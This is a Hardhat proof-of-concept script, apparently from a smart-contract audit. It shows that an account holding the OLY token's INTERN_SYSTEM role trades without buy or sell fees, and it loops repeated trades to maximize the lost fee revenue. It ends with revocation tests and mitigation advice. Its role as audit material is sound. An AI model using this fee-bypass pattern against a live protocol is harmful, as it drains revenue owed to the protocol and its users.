/**
 * CVE-OLY-005: INTERN_SYSTEM Role Complete Fee Bypass Exploit
 * 
 * CRITICAL VULNERABILITY PROOF OF CONCEPT
 * 
 * This exploit demonstrates how users with INTERN_SYSTEM role can completely
 * bypass all fees, leading to massive revenue loss for the protocol.
 * 
 * âš ï¸ FOR TESTNET USE ONLY - DO NOT RUN ON MAINNET
 */

const { ethers } = require("hardhat");
const { expect } = require("chai");

async function main() {
    console.log("ğŸ”´ CVE-OLY-005: INTERN_SYSTEM Role Fee Bypass Exploit");
    console.log("=" .repeat(60));
    
    // Get signers
    const [deployer, attacker, normalUser, mainPair, feeReceiver] = await ethers.getSigners();
    
    console.log("ğŸ‘¤ Deployer:", deployer.address);
    console.log("ğŸ´â€â˜ ï¸ Attacker:", attacker.address);
    console.log("ğŸ‘¤ Normal User:", normalUser.address);
    console.log("ğŸª Main Pair:", mainPair.address);
    console.log("ğŸ’° Fee Receiver:", feeReceiver.address);
    console.log("");

    // Step 1: Deploy mock fee receiver
    console.log("ğŸ“‹ Step 1: Deploying Mock Fee Receiver...");
    
    const MockFeeReceiver = await ethers.getContractFactory("MockFeeReceiver");
    const mockReceiver = await MockFeeReceiver.deploy();
    await mockReceiver.waitForDeployment();
    
    console.log("ğŸ“¡ Mock Fee Receiver deployed at:", await mockReceiver.getAddress());

    // Step 2: Deploy OLY contract
    console.log("\nğŸ“‹ Step 2: Deploying OLY Contract...");
    
    const OLY = await ethers.getContractFactory("OLY");
    const oly = await OLY.deploy(await mockReceiver.getAddress(), 3000); // 3% buy fee
    await oly.waitForDeployment();
    
    console.log("ğŸª™ OLY Contract deployed at:", await oly.getAddress());
    
    const buyFeeRatio = await oly.buyFeeRatio();
    const sellFeeRatio = await oly.feeRatio();
    console.log("ğŸ’¸ Buy Fee Ratio:", buyFeeRatio.toString(), "(3%)");
    console.log("ğŸ’¸ Sell Fee Ratio:", sellFeeRatio.toString(), "(3%)");

    // Step 3: Setup contract state
    console.log("\nğŸ“‹ Step 3: Setting up Contract State...");
    
    await oly.setMainPair(mainPair.address);
    const MINT_ROLE = await oly.MINT();
    const INTERN_SYSTEM_ROLE = await oly.INTERN_SYSTEM();
    await oly.grantRole(MINT_ROLE, deployer.address);
    
    // Mint tokens for testing
    const mintAmount = ethers.parseUnits("100000", 9);
    await oly.mint(attacker.address, mintAmount);
    await oly.mint(normalUser.address, mintAmount);
    await oly.mint(mainPair.address, mintAmount);
    
    console.log("âœ… Main pair set to:", mainPair.address);
    console.log("âœ… Tokens minted to attacker:", ethers.formatUnits(mintAmount, 9));
    console.log("âœ… Tokens minted to normal user:", ethers.formatUnits(mintAmount, 9));
    console.log("âœ… Tokens minted to main pair:", ethers.formatUnits(mintAmount, 9));

    // Step 4: Demonstrate normal fee collection
    console.log("\nğŸ“‹ Step 4: Demonstrating Normal Fee Collection...");
    
    const tradeAmount = ethers.parseUnits("10000", 9);
    
    // Record initial state
    const initialFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const initialNormalUserBalance = await oly.balanceOf(normalUser.address);
    
    console.log("ğŸ’° Initial Fee Receiver Balance:", ethers.formatUnits(initialFeeReceiverBalance, 9));
    console.log("ğŸ‘¤ Initial Normal User Balance:", ethers.formatUnits(initialNormalUserBalance, 9));
    
    // Normal user performs buy transaction (should pay fees)
    console.log("\nğŸ›’ Normal User Buy Transaction:");
    await oly.connect(mainPair).transfer(normalUser.address, tradeAmount);
    
    const afterBuyFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterBuyNormalUserBalance = await oly.balanceOf(normalUser.address);
    
    const buyFeeCollected = afterBuyFeeReceiverBalance - initialFeeReceiverBalance;
    const normalUserReceived = afterBuyNormalUserBalance - initialNormalUserBalance;
    
    console.log("ğŸ’¸ Fee collected:", ethers.formatUnits(buyFeeCollected, 9));
    console.log("ğŸ’° User received:", ethers.formatUnits(normalUserReceived, 9));
    console.log("ğŸ§® Expected fee (3%):", ethers.formatUnits(tradeAmount * 3000n / 100000n, 9));
    
    // Normal user performs sell transaction (should pay fees)
    console.log("\nğŸ’° Normal User Sell Transaction:");
    const sellAmount = ethers.parseUnits("5000", 9);
    
    const beforeSellFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const beforeSellMainPairBalance = await oly.balanceOf(mainPair.address);
    
    await oly.connect(normalUser).transfer(mainPair.address, sellAmount);
    
    const afterSellFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterSellMainPairBalance = await oly.balanceOf(mainPair.address);
    
    const sellFeeCollected = afterSellFeeReceiverBalance - beforeSellFeeReceiverBalance;
    const mainPairReceived = afterSellMainPairBalance - beforeSellMainPairBalance;
    
    console.log("ğŸ’¸ Sell fee collected:", ethers.formatUnits(sellFeeCollected, 9));
    console.log("ğŸª Main pair received:", ethers.formatUnits(mainPairReceived, 9));
    console.log("ğŸ§® Expected sell fee (3%):", ethers.formatUnits(sellAmount * 3000n / 100000n, 9));

    // Step 5: Grant INTERN_SYSTEM role to attacker
    console.log("\nğŸ“‹ Step 5: Granting INTERN_SYSTEM Role to Attacker...");
    
    console.log("ğŸ”‘ Granting INTERN_SYSTEM role to attacker...");
    await oly.grantRole(INTERN_SYSTEM_ROLE, attacker.address);
    
    const hasRole = await oly.hasRole(INTERN_SYSTEM_ROLE, attacker.address);
    console.log("âœ… Attacker has INTERN_SYSTEM role:", hasRole);

    // Step 6: Demonstrate fee bypass exploit
    console.log("\nğŸ“‹ Step 6: Demonstrating Fee Bypass Exploit...");
    
    const exploitAmount = ethers.parseUnits("50000", 9); // Large amount
    
    // Record state before exploit
    const beforeExploitFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const beforeExploitAttackerBalance = await oly.balanceOf(attacker.address);
    const beforeExploitMainPairBalance = await oly.balanceOf(mainPair.address);
    
    console.log("ğŸ’° Fee Receiver Balance before exploit:", ethers.formatUnits(beforeExploitFeeReceiverBalance, 9));
    console.log("ğŸ´â€â˜ ï¸ Attacker Balance before exploit:", ethers.formatUnits(beforeExploitAttackerBalance, 9));
    
    // Attacker performs buy transaction (should bypass fees due to INTERN_SYSTEM role)
    console.log("\nğŸ›’ Attacker Buy Transaction (with INTERN_SYSTEM role):");
    console.log("ğŸ¯ Buy amount:", ethers.formatUnits(exploitAmount, 9));
    console.log("ğŸ§® Expected fee if normal user:", ethers.formatUnits(exploitAmount * 3000n / 100000n, 9));
    
    await oly.connect(mainPair).transfer(attacker.address, exploitAmount);
    
    const afterBuyExploitFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterBuyExploitAttackerBalance = await oly.balanceOf(attacker.address);
    
    const exploitBuyFeeCollected = afterBuyExploitFeeReceiverBalance - beforeExploitFeeReceiverBalance;
    const attackerBuyReceived = afterBuyExploitAttackerBalance - beforeExploitAttackerBalance;
    
    console.log("ğŸ’¸ Fee collected from attacker buy:", ethers.formatUnits(exploitBuyFeeCollected, 9));
    console.log("ğŸ’° Attacker received:", ethers.formatUnits(attackerBuyReceived, 9));
    
    if (exploitBuyFeeCollected === 0n) {
        console.log("ğŸš¨ FEE BYPASS CONFIRMED: No fees collected from INTERN_SYSTEM user!");
    }
    
    if (attackerBuyReceived === exploitAmount) {
        console.log("ğŸš¨ FULL AMOUNT RECEIVED: Attacker received 100% of transfer amount!");
    }
    
    // Attacker performs sell transaction (should also bypass fees)
    console.log("\nğŸ’° Attacker Sell Transaction (with INTERN_SYSTEM role):");
    const attackerSellAmount = ethers.parseUnits("25000", 9);
    
    const beforeSellExploitFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const beforeSellExploitMainPairBalance = await oly.balanceOf(mainPair.address);
    
    console.log("ğŸ¯ Sell amount:", ethers.formatUnits(attackerSellAmount, 9));
    console.log("ğŸ§® Expected fee if normal user:", ethers.formatUnits(attackerSellAmount * 3000n / 100000n, 9));
    
    await oly.connect(attacker).transfer(mainPair.address, attackerSellAmount);
    
    const afterSellExploitFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterSellExploitMainPairBalance = await oly.balanceOf(mainPair.address);
    
    const exploitSellFeeCollected = afterSellExploitFeeReceiverBalance - beforeSellExploitFeeReceiverBalance;
    const mainPairSellReceived = afterSellExploitMainPairBalance - beforeSellExploitMainPairBalance;
    
    console.log("ğŸ’¸ Fee collected from attacker sell:", ethers.formatUnits(exploitSellFeeCollected, 9));
    console.log("ğŸª Main pair received:", ethers.formatUnits(mainPairSellReceived, 9));
    
    if (exploitSellFeeCollected === 0n) {
        console.log("ğŸš¨ SELL FEE BYPASS CONFIRMED: No sell fees collected from INTERN_SYSTEM user!");
    }
    
    if (mainPairSellReceived === attackerSellAmount) {
        console.log("ğŸš¨ FULL SELL AMOUNT RECEIVED: Main pair received 100% of transfer amount!");
    }

    // Step 7: Calculate revenue loss
    console.log("\nğŸ“‹ Step 7: Calculating Revenue Loss...");
    
    const totalAttackerTrades = exploitAmount + attackerSellAmount;
    const expectedTotalFees = (exploitAmount * 3000n / 100000n) + (attackerSellAmount * 3000n / 100000n);
    const actualFeesFromAttacker = exploitBuyFeeCollected + exploitSellFeeCollected;
    const revenueLoss = expectedTotalFees - actualFeesFromAttacker;
    
    console.log("ğŸ“Š Revenue Loss Analysis:");
    console.log("   â€¢ Total attacker trades:", ethers.formatUnits(totalAttackerTrades, 9));
    console.log("   â€¢ Expected total fees:", ethers.formatUnits(expectedTotalFees, 9));
    console.log("   â€¢ Actual fees collected:", ethers.formatUnits(actualFeesFromAttacker, 9));
    console.log("   â€¢ Revenue loss:", ethers.formatUnits(revenueLoss, 9));
    console.log("   â€¢ Loss percentage:", ((revenueLoss * 100n) / expectedTotalFees).toString() + "%");

    // Step 8: Demonstrate systematic exploitation
    console.log("\nğŸ“‹ Step 8: Demonstrating Systematic Exploitation...");
    
    console.log("ğŸ”„ Performing multiple large trades to maximize revenue loss...");
    
    let totalRevenueLoss = revenueLoss;
    
    for (let i = 1; i <= 5; i++) {
        const systematicAmount = ethers.parseUnits("20000", 9);
        
        const beforeSystematicFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
        
        // Buy and sell cycle
        await oly.connect(mainPair).transfer(attacker.address, systematicAmount);
        await oly.connect(attacker).transfer(mainPair.address, systematicAmount);
        
        const afterSystematicFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
        const cycleFeesCollected = afterSystematicFeeBalance - beforeSystematicFeeBalance;
        const expectedCycleFees = (systematicAmount * 3000n / 100000n) * 2n; // Buy + sell
        const cycleLoss = expectedCycleFees - cycleFeesCollected;
        
        totalRevenueLoss += cycleLoss;
        
        console.log(`   Cycle ${i}: Lost ${ethers.formatUnits(cycleLoss, 9)} in fees`);
    }
    
    console.log("ğŸ’¸ Total systematic revenue loss:", ethers.formatUnits(totalRevenueLoss, 9));

    // Step 9: Test role revocation
    console.log("\nğŸ“‹ Step 9: Testing Role Revocation...");
    
    console.log("ğŸ”‘ Revoking INTERN_SYSTEM role from attacker...");
    await oly.revokeRole(INTERN_SYSTEM_ROLE, attacker.address);
    
    const hasRoleAfterRevoke = await oly.hasRole(INTERN_SYSTEM_ROLE, attacker.address);
    console.log("âŒ Attacker has INTERN_SYSTEM role after revoke:", hasRoleAfterRevoke);
    
    // Test that fees are now collected
    const testAmount = ethers.parseUnits("1000", 9);
    const beforeRevokeFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    
    await oly.connect(mainPair).transfer(attacker.address, testAmount);
    
    const afterRevokeFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const revokeTestFee = afterRevokeFeeBalance - beforeRevokeFeeBalance;
    
    console.log("ğŸ’¸ Fee collected after role revoke:", ethers.formatUnits(revokeTestFee, 9));
    
    if (revokeTestFee > 0n) {
        console.log("âœ… Fees are now being collected - role revocation effective");
    }

    // Step 10: Impact Assessment
    console.log("\nğŸ“‹ Step 10: Impact Assessment");
    console.log("=" .repeat(60));
    
    console.log("ğŸ” VULNERABILITY ANALYSIS:");
    console.log("   â€¢ INTERN_SYSTEM role provides complete fee exemption");
    console.log("   â€¢ No limits or monitoring on role usage");
    console.log("   â€¢ Admin can grant role to any address");
    console.log("   â€¢ Role grants are permanent until revoked");
    console.log("");
    
    console.log("ğŸ’° FINANCIAL IMPACT:");
    console.log("   â€¢ Complete revenue loss from fee exemptions");
    console.log("   â€¢ Unfair competitive advantages");
    console.log("   â€¢ Systematic exploitation possible");
    console.log("   â€¢ Total revenue loss demonstrated:", ethers.formatUnits(totalRevenueLoss, 9));
    console.log("");
    
    console.log("ğŸ›¡ï¸ MITIGATION REQUIRED:");
    console.log("   â€¢ Add monitoring and limits on INTERN_SYSTEM role usage");
    console.log("   â€¢ Implement time-limited role grants");
    console.log("   â€¢ Add transparency through events for role changes");
    console.log("   â€¢ Consider partial fee reduction instead of complete bypass");
    console.log("   â€¢ Implement multi-signature for role management");

    console.log("\nğŸ”´ ROLE BYPASS EXPLOIT COMPLETED");
    console.log("âš ï¸ This demonstrates CRITICAL access control vulnerability");
}

// Mock Fee Receiver Contract Source
const mockFeeReceiverSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MockFeeReceiver {
    event SwapTriggered();
    
    function triggerSwapFeeForLottery() external {
        emit SwapTriggered();
    }
}
`;

// Export for use in other scripts
module.exports = {
    main,
    mockFeeReceiverSource
};

// Run if called directly
if (require.main === module) {
    main()
        .then(() => process.exit(0))
        .catch((error) => {
            console.error("ğŸ’¥ Exploit failed:", error);
            process.exit(1);
        });
}